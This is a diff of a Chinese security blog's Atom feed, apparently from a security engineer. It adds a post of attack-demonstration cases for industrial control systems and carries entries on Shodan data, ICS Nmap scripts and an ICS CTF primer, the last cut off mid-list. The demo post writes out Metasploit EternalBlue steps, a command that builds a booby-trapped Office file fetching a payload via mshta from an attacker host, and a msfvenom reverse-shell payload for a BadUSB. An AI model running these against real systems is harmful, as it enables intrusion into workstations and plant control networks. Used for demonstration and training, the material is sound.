@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://hi-kk.github.io/</id>
-    <title>KEYONE</title>
-    <updated>2019-07-26T08:38:13.023Z</updated>
+    <title>KEYONE——三年级小学生</title>
+    <updated>2019-09-09T09:09:21.699Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://hi-kk.github.io/"/>
     <link rel="self" href="https://hi-kk.github.io//atom.xml"/>
@@ -10,7 +10,114 @@
 LOVE &amp; PEACE ❤️JUST FOR FUN</subtitle>
     <logo>https://hi-kk.github.io//images/avatar.png</logo>
     <icon>https://hi-kk.github.io//favicon.ico</icon>
-    <rights>All rights reserved 2019, KEYONE</rights>
+    <rights>All rights reserved 2019, KEYONE——三年级小学生</rights>
+    <entry>
+        <title type="html"><![CDATA[工控安全——攻防演示案例]]></title>
+        <id>https://hi-kk.github.io//post/89QQGqE</id>
+        <link href="https://hi-kk.github.io//post/89QQGqE">
+        </link>
+        <updated>2019-09-09T02:22:05.000Z</updated>
+        <summary type="html"><![CDATA[<p>列举一些可以在工控安全项目中用的攻防演示案例，持续更新......</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>列举一些可以在工控安全项目中用的攻防演示案例，持续更新......</p>
+<!-- more -->
+<h2 id="前言">前言</h2>
+<p>在某核电的安全项目中，感谢公司leader信任让我负责项目的总体方案设计、攻防案例设计、安全防护等方案，经过前期大量的搜索、复现、思考、选取，顺利完成该项目的建设实施。于是，在此文中分享一些可以在工控安全项目中进行攻防演示的案例，以供大家参考。<br>
+<img src="https://hi-kk.github.io//post-images/1568005767519.png" alt=""></p>
+<h2 id="针对工控系统上位机操作系统攻防案例">针对工控系统上位机操作系统攻防案例</h2>
+<h3 id="漏洞一">漏洞一</h3>
+<p>MS17-010 （永恒之蓝Eternalblue）</p>
+<h4 id="漏洞描述">漏洞描述</h4>
+<p>永恒之蓝（Eternalblue）通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
+<h4 id="漏洞影响">漏洞影响</h4>
+<p>目前已知受影响的 Windows 版本包括但不限于：Windows NT，Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012等。</p>
+<h4 id="演示步骤">演示步骤</h4>
+<p>1.使用nmap对目标进行扫描，确定目标存在永恒之蓝漏洞，执行如下命令<br>
+<code>nmap --script smb-vuln-ms17-010 192.168.28.128</code><br>
+2.使用Metasploit对目标进行攻击，执行如下操作<br>
+输入msfconsole启动Metasploit<br>
+在Metasploit中，输入<code>search ms17-010</code>查找永恒之蓝漏洞<br>
+<img src="https://hi-kk.github.io//post-images/1567999055423.png" alt=""><br>
+输入<code>use exploit/windows/smb/ms17_010_eternalblue</code>选择漏洞利用模块<br>
+输入<code>show options</code>查看当前攻击配置<br>
+<img src="https://hi-kk.github.io//post-images/1567999084048.png" alt=""><br>
+将配置中第一行的<code>RHOST</code>修改为目标IP地址<br>
+配置完成后，输入<code>run</code>命令执行漏洞攻击，如果执行成功，会获得目标机器windows系统的shell终端，可对该目标机器执行任何命令<br>
+<img src="https://hi-kk.github.io//post-images/1567999098267.png" alt=""></p>
+<h2 id="针对工控系统上位机办公软件攻防案例">针对工控系统上位机办公软件攻防案例</h2>
+<h3 id="漏洞一-2">漏洞一：</h3>
+<p>CVE-2017-11882&amp;CVE-2018-0802 (Microsoft Office内存破坏漏洞)</p>
+<h4 id="漏洞描述-2">漏洞描述</h4>
+<p>在2017年11月14日，微软发布11月份安全补丁更新，其中更新了潜伏17年之久的Office远程代码执行漏洞(CVE-2017-11882) “噩梦公式一代“，而在2018年1月，又爆出了office 0day漏洞(CVE-2018-0802),该漏洞的技术原理类似17年修补的漏洞，是由于office公式编辑器组件EQNEDT32.EXE，对字体名的长度没有进行长度检验，导致攻击者可以通过构造恶意的字体名，执行任意代码。</p>
+<h4 id="漏洞影响-2">漏洞影响</h4>
+<ol>
+<li>Microsoft Office 2007 Service Pack 3</li>
+<li>Microsoft Office 2010 Service Pack 2</li>
+<li>Microsoft Office 2013 Service Pack 1</li>
+<li>Microsoft Office 2016</li>
+</ol>
+<h4 id="演示步骤-2">演示步骤</h4>
+<p>1.下载漏洞利用脚本备用<br>
+https://github.com/Ridter/RTF_11882_0802/blob/master/RTF_11882_0802.py<br>
+2.使用Metasploit生成攻击反向控制后门文件<br>
+<img src="https://hi-kk.github.io//post-images/1567999327764.png" alt=""><br>
+3.使用漏洞利用脚本，执行如下命令，生成包含漏洞的office文件<br>
+<code>python RTF_11882_0802.py -c &quot;mshta http://192.168.103.152:8080/123&quot; -o test.doc</code><br>
+4.将生成的test.doc文件，利用一些手段传给目标，当目标打开此文件时，会反弹出一个shell会话到攻击机，此时，攻击者已经控制了目标<br>
+<img src="https://hi-kk.github.io//post-images/1567999336471.png" alt=""></p>
+<h2 id="针对工控系统上位机usb外设攻防案例">针对工控系统上位机USB外设攻防案例</h2>
+<h3 id="攻击手法">攻击手法</h3>
+<p>badUSB<br>
+<img src="https://hi-kk.github.io//post-images/1567999635816.png" alt=""></p>
+<h4 id="原理简述">原理简述</h4>
+<p>BadUSB最早是在2014年的黑帽大会上研究人员JakobLell和Karsten Nohl提出并展示的。不同于老式的U盘病毒，它利用了USB协议中的一个漏洞，通过模拟键盘、鼠标、网卡等从而让目标电脑执行恶意代码，达到控住主机或者窃取敏感信息等目的。<br>
+<img src="https://hi-kk.github.io//post-images/1567999651031.png" alt=""><br>
+从传统意义讲，当你在电脑中插入一张CD/DVD光盘，或者插入一个USB设备时，可以通过自动播放来运行一个包含恶意的文件，不过自动播放功能被关闭时，autorun.inf文件就无法自动执行你的文件了。然而通过TEENSY，你可以模拟出一个键盘和鼠标，当你插入这个定制的USB设备时，电脑会识别为一个键盘，利用设备中的微处理器，与存储空间，和编程进去的攻击代码，就可以向主机发送控制命令，从而完全控制主机，无论自动播放是否开启，都可以成功。<br>
+<img src="https://hi-kk.github.io//post-images/1567999686921.png" alt=""></p>
+<h4 id="演示步骤-3">演示步骤</h4>
+<p>1.攻击者事先制作好badUSB硬件设备，选择基于ATTINY85微控制器的USB开发板Digispark。<br>
+2.使用烧录代码的编译器Arduino IDE，将恶意代码烧录到BadUSB中。<br>
+<img src="https://hi-kk.github.io//post-images/1567999547755.png" alt=""><br>
+3.配置好相关参数，将开发板设为Digispark，编程器设为USBtinyISP，编写好代码后，就可以点击“上传”按钮，然后插入BadUSB设备，一款简易BadUSB就做好了。<br>
+4.使用Metasploit生成攻击反向控制后门文件，执行如下命令<br>
+<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.128 LPORT=5555 -f exe &gt;shell.exe</code><br>
+5.在MSF服务端，开启监听，等待目标机器中后门反弹回shell<br>
+6.攻击者可诱使目标机器的使用者将特制的badusb设备插入目标设备，当目标机器被插上U盘后，即会自动执行内部控制代码，在目标设备上模拟键鼠进行操作，下载执行了后门文件，此时攻击者就获得了目标机器反弹的shell，控制了目标机器。</p>
+<h2 id="针对工控系统编程组态软件攻防案例">针对工控系统编程组态软件攻防案例</h2>
+<h3 id="攻击手法一">攻击手法一</h3>
+<p>Stuxnet（震网）</p>
+<h3 id="震网病毒简述">震网病毒简述</h3>
+<p><img src="https://hi-kk.github.io//post-images/1568006481557.png" alt=""><br>
+<img src="https://hi-kk.github.io//post-images/1568006603026.png" alt=""></p>
+<h3 id="震网传播方式">震网传播方式</h3>
+<p>Stuxnet 蠕虫的攻击目标是 SIMATIC WinCC 软件。后者主要用于工业控制系统的数据采集与监控，一般部署在专用的内部局域网中，并与外部互联网实行物理上的隔离。为了实现攻击，Stuxnet 蠕虫采取多种 手段进行渗透和传播，如图所示<br>
+<img src="https://hi-kk.github.io//post-images/1568006704848.png" alt=""><br>
+整体的传播思路是：首先感染外部主机;然后感染 U 盘，利用快捷方式文件解析漏洞，传播到内部网络;在内网中，通过快捷方式解析漏洞、RPC 远程执行漏洞、打印机后台程序服务漏洞，实现联网主机之间的传播;最后抵达安装了 WinCC 软件的主机，展开攻击。<br>
+一旦发现WinCC系统，就利用其中的两个漏洞展开攻击</p>
+<ol>
+<li>一个是WinCC系统中存在一个硬编码漏洞，保护访问数据库的默认用户名和密码，Stuxnet利用这一漏洞尝试访问该系统的SQL数据库</li>
+<li>另一个是WinCC需要使用的Step7工程中，在打开工程文件时，存在DLL加载策略上的缺陷，从而导致一种类似于“DLL预加载攻击”的利用方式。最终，Stuxnet通过替换Step7软件中的s7otbxdx.dll，实现对一些查询、读取函数的Hook。</li>
+</ol>
+<h2 id="针对工控系统scada系统攻防案例">针对工控系统SCADA系统攻防案例</h2>
+<h3 id="漏洞一-3">漏洞一</h3>
+<p>CVE-2017-16720</p>
+<h4 id="漏洞简述">漏洞简述</h4>
+<p>此漏洞允许攻击者使用RPC协议通过TCP端口4592执行远程命令。<br>
+通过利用恶意分布式计算环境/远程过程调用（DCERPC），webvrpcs.exe服务将命令行指令传递给主机， webvrpcs.exe服务以管理员访问权限运行。版本小于8.3、8.3.1、8.3.2仍然存在特定的安全漏洞。</p>
+<h4 id="演示步骤-4">演示步骤</h4>
+<p>参见博主之前发的文章<a href="https://hi-kk.github.io/post/lou-dong-shi-yan-cve-2017-16720-advantech-webaccess-yuan-cheng-ming-ling-zhi-xing-lou-dong/">漏洞实验：Advantech WebAccess远程命令执行</a></p>
+<h2 id="针对工控系统plc攻防案例">针对工控系统PLC攻防案例</h2>
+<h3 id="攻击手法一-2">攻击手法一</h3>
+<p>针对西门子S7协议或罗克韦尔AB Ethernet/IP、施耐德Modbus等工控协议，攻击者通过对主流工控协议的深度分析，向PLC设备发送远程停机、程序上传下载等控制指令数据报文，实现对下位机PLC的非法控制。</p>
+<h4 id="演示步骤-5">演示步骤</h4>
+<p>参见博主之前发的文章<a href="https://hi-kk.github.io//post/gong-kong-an-quan-s7-1200-plc-yuan-cheng-qi-ting-gong-ji-shi-yan">工控安全：S7-1200 PLC远程启停攻击实验</a></p>
+<h2 id="针对工控系统opc数据通信攻防案例">针对工控系统OPC数据通信攻防案例</h2>
+<h3 id="攻击手法一-3">攻击手法一</h3>
+<p>利用OPC协议漏洞，在通过OPC服务器与MES服务器进行数据通信过程中，攻击者可以伪装成合法的OPC Client对工控系统数据进行读写。<br>
+<img src="https://hi-kk.github.io//post-images/1568008182432.png" alt=""></p>
+<h2 id="持续更新">持续更新......</h2>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[CentOS下安装KVM环境及VMWare与KVM互相转换]]></title>
         <id>https://hi-kk.github.io//post/centos-xia-an-zhuang-kvm-huan-jing-ji-vmware-yu-kvm-hu-xiang-zhuan-huan</id>
@@ -217,7 +324,6 @@ $str_tmp = &quot;&lt;?php
 ]]></summary>
         <content type="html"><![CDATA[<p>-_- 无FCUK说....</p>
 <!--more-->
-<p><img src="https://hi-kk.github.io//post-images/1563882268454.png" alt=""></p>
 <h2 id="需求">需求</h2>
 <p>使用Python编写一个脚本，实现向特定端口发送特定的探测payload报文，根据响应包，取特定字节范围的字符进行输出</p>
 <h2 id="实例">实例</h2>
@@ -565,21 +671,19 @@ root@kali:~#
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[漏洞实验：CVE-2017-16720-Advantech WebAccess远程命令执行]]></title>
+        <title type="html"><![CDATA[漏洞实验：Advantech WebAccess远程命令执行]]></title>
         <id>https://hi-kk.github.io//post/lou-dong-shi-yan-cve-2017-16720-advantech-webaccess-yuan-cheng-ming-ling-zhi-xing-lou-dong</id>
         <link href="https://hi-kk.github.io//post/lou-dong-shi-yan-cve-2017-16720-advantech-webaccess-yuan-cheng-ming-ling-zhi-xing-lou-dong">
         </link>
         <updated>2019-01-08T05:50:11.000Z</updated>
         <summary type="html"><![CDATA[<h2 id="漏洞编号">漏洞编号</h2>
 <p>CVE-2017-16720</p>
-<p>此漏洞允许攻击者使用RPC协议通过TCP端口4592执行远程命令。<br>
-通过利用恶意分布式计算环境/远程过程调用（DCERPC），webvrpcs.exe服务将命令行指令传递给主机， webvrpcs.exe服务以管理员访问权限运行。版本小于8.3、8.3.1、8.3.2仍然存在特定的安全漏洞。</p>
 ]]></summary>
         <content type="html"><![CDATA[<h2 id="漏洞编号">漏洞编号</h2>
 <p>CVE-2017-16720</p>
+<!--more-->
 <p>此漏洞允许攻击者使用RPC协议通过TCP端口4592执行远程命令。<br>
 通过利用恶意分布式计算环境/远程过程调用（DCERPC），webvrpcs.exe服务将命令行指令传递给主机， webvrpcs.exe服务以管理员访问权限运行。版本小于8.3、8.3.1、8.3.2仍然存在特定的安全漏洞。</p>
-<!--more-->
 <h2 id="漏洞说明">漏洞说明</h2>
 <blockquote>
 <p>研华WebAccess软件是研华物联网应用平台解决方案的核心，为用户提供一个基于HTML5技术用户界面，实现跨平台、跨浏览器的数据访问体验。使用WebAccess后，用户可以建立一个信息管理平台，同步提高垂直市场管理发展的效率。</p>
@@ -617,7 +721,10 @@ root@kali:~#
         <link href="https://hi-kk.github.io//post/gong-kong-an-quan-s7-1200-plc-yuan-cheng-qi-ting-gong-ji-shi-yan">
         </link>
         <updated>2018-12-29T02:20:08.000Z</updated>
-        <content type="html"><![CDATA[<!--more-->
+        <summary type="html"><![CDATA[<p>公司刚好有此PLC设备，于是利用github上的开源脚本对S7-1200 PLC进行远程启停攻击实验</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>公司刚好有此PLC设备，于是利用github上的开源脚本对S7-1200 PLC进行远程启停攻击实验</p>
+<!--more-->
 <h2 id="工具及运行环境">工具及运行环境</h2>
 <pre><code class="language-bash">root@kali:~# git clone https://github.com/dark-lbp/isf/
 root@kali:~# cd isf/
@@ -651,12 +758,15 @@ root@kali:~/isf# pip install -r requirements.txt
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[漏洞实验：CVE-2018-15982-Adobe Flash Player远程代码执行]]></title>
+        <title type="html"><![CDATA[漏洞实验：Adobe Flash Player远程代码执行]]></title>
         <id>https://hi-kk.github.io//post/lou-dong-shi-yan-cve-2018-15982-adobe-flash-player-yuan-cheng-dai-ma-zhi-xing</id>
         <link href="https://hi-kk.github.io//post/lou-dong-shi-yan-cve-2018-15982-adobe-flash-player-yuan-cheng-dai-ma-zhi-xing">
         </link>
         <updated>2018-12-26T01:11:13.000Z</updated>
-        <content type="html"><![CDATA[<!--more-->
+        <summary type="html"><![CDATA[<p>漏洞编号：CVE-2018-15982</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>漏洞编号：CVE-2018-15982</p>
+<!-- more -->
 <h2 id="漏洞简介">漏洞简介</h2>
 <table>
 <thead>
@@ -744,6 +854,657 @@ msf exploit(multi/handler) &gt; run
 <img src="https://hi-kk.github.io//post-images/1563970426386.png" alt=""><br>
 注意：当浏览器访问的标签页关闭了，反弹的shell也会断开连接<br>
 <img src="https://hi-kk.github.io//post-images/1563970440508.png" alt=""></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[工控安全：如何将Shodan数据完美地存入数据库]]></title>
+        <id>https://hi-kk.github.io//post/gong-kong-an-quan-ru-he-jiang-shodan-shu-ju-wan-mei-di-cun-ru-shu-ju-ku</id>
+        <link href="https://hi-kk.github.io//post/gong-kong-an-quan-ru-he-jiang-shodan-shu-ju-wan-mei-di-cun-ru-shu-ju-ku">
+        </link>
+        <updated>2018-12-19T06:33:45.000Z</updated>
+        <summary type="html"><![CDATA[<h2 id="开局">开局</h2>
+<p><em>“ 开局一张图，内容全靠编 ”</em></p>
+]]></summary>
+        <content type="html"><![CDATA[<h2 id="开局">开局</h2>
+<p><em>“ 开局一张图，内容全靠编 ”</em></p>
+<!--more-->
+<hr>
+<p>先从需求说起：现在需要将shodan上关于工控相关协议和产品设备的指纹数据下载下来，录入本地的数据库<br>
+好在shodan提供了data下载的功能，不过下载一次消耗<strong>1 export credit = 10,000 results</strong>,而这个<strong>credit</strong>是需要购买的。<br>
+<img src="https://hi-kk.github.io//post-images/1564126484518.png" alt=""><br>
+通过一些途径，我们的账户现在有了一些<strong>credit</strong>可供下载数据，而shodan也提供三种下载数据的文件格式（json、csv、xml）<br>
+<img src="https://hi-kk.github.io//post-images/1564126500170.png" alt=""><br>
+按说，这三种格式的文件是可以直接通过Navicat导入到数据库的<br>
+<img src="https://hi-kk.github.io//post-images/1564126514623.png" alt=""></p>
+<h2 id="困境">困境</h2>
+<p>但是，我们从shodan上下载的文件准备直接导入数据库时候发生了一些问题：</p>
+<ol>
+<li>shodan下载出的csv文件所存储的信息有效，缺少服务、产品型号、经纬度等<br>
+<img src="https://hi-kk.github.io//post-images/1564126563239.png" alt=""></li>
+<li>直接用下载出的json文件去导入数据库，发现只能导入字段名，而没有值<br>
+<img src="https://hi-kk.github.io//post-images/1564126578261.png" alt=""></li>
+</ol>
+<p>为了解决这个困惑，查阅相关资料，我们了解到shodan有python版的库，其中包含了格式化的命令功能</p>
+<blockquote>
+<p>pip install shodan<br>
+shodan<br>
+<img src="https://hi-kk.github.io//post-images/1564126595734.png" alt=""><br>
+<img src="https://hi-kk.github.io//post-images/1564126622839.png" alt=""></p>
+</blockquote>
+<p>可以通过以下命令来对json文件进行格式化操作，输出包含特定值的csv格式文件<br>
+<code>shodan parse --fields ip_str,hostnames,isp,org,timestamp --separator , xxx.json &gt;&gt; xx.csv</code></p>
+<hr>
+<p>然而，结果还没达到我们想要的结果，如下图是一个标准的shodan给的json数据格式<br>
+<img src="https://hi-kk.github.io//post-images/1564126649439.png" alt=""><br>
+我们执行<code>shodan parse</code>命令只能格式化出跟节点的数据，如<code>ip|isp|port|hostnames|timestamp</code>等，而对第二节点的数据却难以获取到，如<code>location</code>节点下的<code>city|region_code|area_code</code>等<br>
+那如果我们直接取<code>location</code>节点下的所有数据呢？输出的结果如下图<br>
+<img src="https://hi-kk.github.io//post-images/1564126661173.png" alt=""><br>
+可以看到，虽然这样是把<code>location</code>节点下所有的数据都取出来了，但是却有一些冗余数据，不符合要求，还得需要二次处理这些数据才能入库</p>
+<p>那还有其他可以直接取出格式化的数据、不需要二次处理、直接导入数据库的方法吗？</p>
+<h2 id="柳暗花明">柳暗花明</h2>
+<p>这里我们再次研究发现shodan还有个内置命令<br>
+<code>shodan convert</code></p>
+<blockquote>
+<p>convert命令可以把Shodan生成的JSON报告转化成KML和CSV格式</p>
+</blockquote>
+<p><img src="https://hi-kk.github.io//post-images/1564126675423.png" alt=""><br>
+输出的csv内容如下<br>
+<img src="https://hi-kk.github.io//post-images/1564126686864.png" alt=""><br>
+确实比上一次的数据要整洁的多了，但多了一些不需要的字段，得想想办法去除，要是能自定义输出的字段数据就好了<br>
+于是，我们想到可以研究下shodan的python库源码，看看能不能修改点代码什么的</p>
+<hr>
+<p>找到shodan的python安装包，寻找跟<code>convert</code>有关的功能模块代码<br>
+<code>shodan-1.10.4.tar\shodan-1.10.4\shodan\cli\converter</code><br>
+<img src="https://hi-kk.github.io//post-images/1564126713217.png" alt=""><br>
+看来我们要想修改的代码可能就是<code>csvc.py</code><br>
+我们按原代码的格式修改需要提取的字段值<br>
+<img src="https://hi-kk.github.io//post-images/1564126726790.png" alt=""><br>
+保存之后，再重新安装<code>shodan</code><br>
+此时输出的结果就已经达到我们想要的了<br>
+<img src="https://hi-kk.github.io//post-images/1564126737995.png" alt=""><br>
+现在，我们再用<code>Navicat</code>导入数据库就会非常顺利了<br>
+<img src="https://hi-kk.github.io//post-images/1564126747530.png" alt=""><br>
+<img src="https://hi-kk.github.io//post-images/1564126761350.png" alt=""><br>
+<img src="https://hi-kk.github.io//post-images/1564126782507.png" alt=""><br>
+<img src="https://hi-kk.github.io//post-images/1564126797994.png" alt=""></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Hello Gridea]]></title>
+        <id>https://hi-kk.github.io//post/hello-gridea</id>
+        <link href="https://hi-kk.github.io//post/hello-gridea">
+        </link>
+        <updated>2018-12-11T16:00:00.000Z</updated>
+        <summary type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
+✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
+✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
+<!-- more -->
+<p><a href="https://github.com/getgridea/gridea">Github</a><br>
+<a href="http://hvenotes.fehey.com/">Gridea 主页</a><br>
+<a href="http://fehey.com/">示例网站</a></p>
+<h2 id="特性">特性👇</h2>
+<p>📝  你可以使用最酷的 <strong>Markdown</strong> 语法，进行快速创作</p>
+<p>🌉  你可以给文章配上精美的封面图和在文章任意位置插入图片</p>
+<p>🏷️  你可以对文章进行标签分组</p>
+<p>📋  你可以自定义菜单，甚至可以创建外部链接菜单</p>
+<p>💻  你可以在 <strong>𝖶𝗂𝗇𝖽𝗈𝗐𝗌</strong> 或 <strong>𝖬𝖺𝖼𝖮𝖲</strong> 设备上使用此客户端</p>
+<p>🌎  你可以使用 <strong>𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌</strong> 或 <strong>Coding Pages</strong> 向世界展示，未来将支持更多平台</p>
+<p>💬  你可以进行简单的配置，接入 <a href="https://github.com/gitalk/gitalk">Gitalk</a> 或 <a href="https://github.com/SukkaW/DisqusJS">DisqusJS</a> 评论系统</p>
+<p>🇬🇧  你可以使用<strong>中文简体</strong>或<strong>英语</strong></p>
+<p>🌁  你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力</p>
+<p>🖥  你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步</p>
+<p>🌱 当然 <strong>Gridea</strong> 还很年轻，有很多不足，但请相信，它会不停向前🏃</p>
+<p>未来，它一定会成为你离不开的伙伴</p>
+<p>尽情发挥你的才华吧！</p>
+<p>😘 Enjoy~</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[工控安全：Nmap NSE扫描脚本列表]]></title>
+        <id>https://hi-kk.github.io//post/gong-kong-an-quan-nmap-nse-sao-miao-jiao-ben-lie-biao</id>
+        <link href="https://hi-kk.github.io//post/gong-kong-an-quan-nmap-nse-sao-miao-jiao-ben-lie-biao">
+        </link>
+        <updated>2018-11-20T01:11:33.000Z</updated>
+        <summary type="html"><![CDATA[<p>这里的nse脚本列表是针对工控协议的</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>这里的nse脚本列表是针对工控协议的</p>
+<!--more-->
+<table>
+<thead>
+<tr>
+<th>Nmap NSE脚本</th>
+<th>端口</th>
+<th>插件信息</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>mms-identify.nse</td>
+<td>102</td>
+<td>iec-61850-8-1 (mms) ics protocol</td>
+</tr>
+<tr>
+<td>s7-enumerate.nse</td>
+<td>102</td>
+<td>numerates Siemens S7 PLC Devices and collects their device information</td>
+</tr>
+<tr>
+<td>modbus-discover.nse</td>
+<td>502</td>
+<td>Enumerates SCADA Modbus slave ids (sids) and collects their device information</td>
+</tr>
+<tr>
+<td>modicon-info.nse</td>
+<td>502</td>
+<td>use Modbus to communicate to the PLC via Normal queries that are performed via engineering software</td>
+</tr>
+<tr>
+<td>cr3-fingerprint.nse</td>
+<td>789</td>
+<td>Fingerprints Red Lion HMI devices</td>
+</tr>
+<tr>
+<td>moxa-enum.nse</td>
+<td>4800</td>
+<td>MoxaNPort</td>
+</tr>
+<tr>
+<td>melsecq-discover.nse</td>
+<td>5007</td>
+<td>MELSEC-Q Series PLC CPUINFO</td>
+</tr>
+<tr>
+<td>melsecq-discover-udp.nse</td>
+<td>5006</td>
+<td>MELSEC-Q Series PLC CPUINFO</td>
+</tr>
+<tr>
+<td>BACnet-discover-enumerate.nse</td>
+<td>47808</td>
+<td>BACnet</td>
+</tr>
+<tr>
+<td>atg-info.nse</td>
+<td>10001</td>
+<td>Guardian AST I20100</td>
+</tr>
+<tr>
+<td>codesys-v2-discover.nse</td>
+<td>1200/2455</td>
+<td>received then the output will show that the port as CoDeSyS</td>
+</tr>
+<tr>
+<td>cspv4-info.nse</td>
+<td>2222</td>
+<td>cspv4-info</td>
+</tr>
+<tr>
+<td>dnp3-info.nse</td>
+<td>20000</td>
+<td>DNP3</td>
+</tr>
+<tr>
+<td>enip-enumerate.nse</td>
+<td>44818</td>
+<td>Information that is parsed includes Vendor ID, Device Type, Product name, Serial Number, Product code,Revision Number, as well as the Device IP</td>
+</tr>
+<tr>
+<td>fox-info.nse</td>
+<td>1911</td>
+<td>collect information from A Tridium Niagara system</td>
+</tr>
+<tr>
+<td>omrontcp-info.nse</td>
+<td>9600</td>
+<td>Controller Data Read Command and once a response is received</td>
+</tr>
+<tr>
+<td>omronudp-info.nse</td>
+<td>9600</td>
+<td>Controller Data Read Command and once a response is received</td>
+</tr>
+<tr>
+<td>pcworx-info.nse</td>
+<td>1962</td>
+<td>PCWorx info</td>
+</tr>
+<tr>
+<td>proconos-info.nse</td>
+<td>20547</td>
+<td>ProConOs</td>
+</tr>
+<tr>
+<td>Siemens-CommunicationsProcessor.nse</td>
+<td>80</td>
+<td>Checks for SCADA Siemens S7 Communications Processor devices</td>
+</tr>
+<tr>
+<td>Siemens-HMI-miniweb.nse</td>
+<td>80</td>
+<td>Checks for SCADA Siemens SIMATIC S7- devices</td>
+</tr>
+<tr>
+<td>Siemens-SIMATIC-PLC-S7.nse</td>
+<td>80</td>
+<td>Checks for SCADA Siemens Simatic S7 devices</td>
+</tr>
+<tr>
+<td>Siemens-Scalance-module.nse</td>
+<td>161</td>
+<td>Checks for SCADA Siemens SCALANCE modules</td>
+</tr>
+<tr>
+<td>Siemens-WINCC.nse</td>
+<td>137</td>
+<td>Checks for SCADA Siemens WINCC server</td>
+</tr>
+<tr>
+<td>bradford-networks-nac.nse</td>
+<td>8080</td>
+<td>Attempts to detect Bradford Networks Network Sentry appliance admin web interface</td>
+</tr>
+<tr>
+<td>iec-identify.nse</td>
+<td>2404</td>
+<td>Attemts to check tcp/2404 port supporting IEC 60870-5-104 ICS protocol</td>
+</tr>
+<tr>
+<td>minecraft.nse</td>
+<td>25565</td>
+<td>Checks for Minecraft Servers using the 0x02 &quot;Handshake&quot; protocol</td>
+</tr>
+<tr>
+<td>mop-discover.nse</td>
+<td>null</td>
+<td>Detect the Maintenance Operation Protocol (MOP) by sending layer 2 DEC DNA Remote Console hello/test messages</td>
+</tr>
+<tr>
+<td>stuxnet-detect.nse</td>
+<td>445</td>
+<td>Detects whether a host is infected with the Stuxnet worm</td>
+</tr>
+</tbody>
+</table>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[工控安全：CTF赛前小知识]]></title>
+        <id>https://hi-kk.github.io//post/gong-kong-an-quan-ctf-sai-qian-xiao-zhi-shi</id>
+        <link href="https://hi-kk.github.io//post/gong-kong-an-quan-ctf-sai-qian-xiao-zhi-shi">
+        </link>
+        <updated>2018-11-09T06:17:00.000Z</updated>
+        <summary type="html"><![CDATA[<p>看到一篇有关工控CTF的赛前知识点介绍，感觉比较详细的，在此分享一下</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>看到一篇有关工控CTF的赛前知识点介绍，感觉比较详细的，在此分享一下</p>
+<!--more-->
+<h2 id="工控比赛考察点">工控比赛考察点</h2>
+<p>采用 CTF 分类模型，总结分析当前工控 ICS 比赛中的关键点</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">比赛类型</th>
+<th style="text-align:left">考察点</th>
+<th style="text-align:left">与 CTF 异同</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">内网渗透</td>
+<td style="text-align:left">Web 端渗透测试、CMS 系统、工控发布展示系统、数据库系统</td>
+<td style="text-align:left">与 Web 渗透相关</td>
+</tr>
+<tr>
+<td style="text-align:left">逆向分析</td>
+<td style="text-align:left">固件分析、工控软件逆向</td>
+<td style="text-align:left">实际场景逆向</td>
+</tr>
+<tr>
+<td style="text-align:left">工控协议</td>
+<td style="text-align:left">工控流量分析、Misc 类</td>
+<td style="text-align:left">Misc 流量分析，工控场景流量特征</td>
+</tr>
+<tr>
+<td style="text-align:left">工控编程</td>
+<td style="text-align:left">PLC 组态、HMI 组态、RTU 组态等</td>
+<td style="text-align:left">工控实际组态软件使用，梯形图识别与分析</td>
+</tr>
+</tbody>
+</table>
+<p>根据漏洞类型其实还可以区分细化题目类型，包括常见的 Web 注入类、固件弱口令、后门程序、协议重放与逻辑问题、组态部署问题等常见的工控场景安全问题。</p>
+<table>
+<thead>
+<tr>
+<th>比赛类型</th>
+<th>漏洞类型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>内网渗透</td>
+<td>Web 类（SQL、XSS、命令注入、敏感文件泄露. git/.idea/.project 等、）</td>
+</tr>
+<tr>
+<td>逆向分析</td>
+<td>固件分析、工控软件逆向</td>
+</tr>
+<tr>
+<td>工控协议</td>
+<td>工控流量分析、Misc 类</td>
+</tr>
+<tr>
+<td>工控编程</td>
+<td>PLC 组态、HMI 组态</td>
+</tr>
+</tbody>
+</table>
+<h3 id="web-渗透类web">Web 渗透类（Web）</h3>
+<p>该节主要谈工控 Web 渗透的特点：</p>
+<ul>
+<li>
